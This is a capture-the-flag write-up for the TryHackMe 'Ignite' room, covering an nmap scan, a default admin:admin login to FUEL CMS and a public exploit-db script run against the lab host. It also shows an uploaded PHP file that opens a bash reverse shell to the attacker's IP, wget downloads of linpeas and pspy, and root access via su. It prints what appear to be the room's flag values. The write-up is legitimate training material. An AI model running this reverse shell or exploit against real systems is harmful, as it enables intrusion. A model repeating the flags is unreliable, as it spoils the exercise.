# TryHackMe Ignite Writeup

## `Nmap` scan

```ruby
nmap -sCV 10.10.10.10
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 07:35 EDT
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.10.23.89
Host is up (0.099s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.90 seconds

```

<img width="1917" height="714" alt="image" src="https://github.com/user-attachments/assets/7b7145a5-bc3c-4fc3-bdb1-a841c40e0221" />

<img width="1626" height="391" alt="image" src="https://github.com/user-attachments/assets/6968b901-5ce1-40ce-9963-5e8ec345014c" />

````
admin : admin
````

<img width="1644" height="460" alt="image" src="https://github.com/user-attachments/assets/2cdb03de-cbee-4f11-bbd3-2c04ff1f5d3d" />

```
searchsploit fuel cms
```

<img width="1081" height="273" alt="image" src="https://github.com/user-attachments/assets/824c3cd6-45f9-4a54-b3bf-c1bb97ed7419" />

```
python3 /usr/share/exploitdb/exploits/php/webapps/50477.py -u http://10.10.23.89
```

<img width="960" height="513" alt="image" src="https://github.com/user-attachments/assets/8349fbee-010a-4002-a2cd-121543fe0416" />

```
6470e394cbf6dab6a91682cc8585059b
```

<img width="843" height="227" alt="image" src="https://github.com/user-attachments/assets/f62a4bfc-ea3a-41d1-bab7-1f05eeac955a" />

> ## create new file have revese shell on my device and send it to server

```php
<?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.47.102/4444 0>&1'");
?>

```

<img width="988" height="263" alt="image" src="https://github.com/user-attachments/assets/48cb3b3d-1c5f-44ea-8677-ec64a4ec641f" />

```
wget http://10.8.47.102:8888/linpeas.sh
wget http://10.8.47.102:8888/pspy64
```

<img width="948" height="209" alt="image" src="https://github.com/user-attachments/assets/4f50d09a-69d6-4ea4-9446-736c1ea34ebb" />

<img width="960" height="446" alt="image" src="https://github.com/user-attachments/assets/ff48e9a2-3c65-477c-a5b0-326233380c72" />

> ## try this password to root

```
su - 
```

<img width="894" height="187" alt="image" src="https://github.com/user-attachments/assets/92d3020a-f4d6-4dd0-b09c-a88ed189834e" />

<img width="765" height="84" alt="image" src="https://github.com/user-attachments/assets/bec8e900-560c-4191-9386-b213ce80dd97" />

```
b9bbcb33e11b80be759c4e844862482d
```

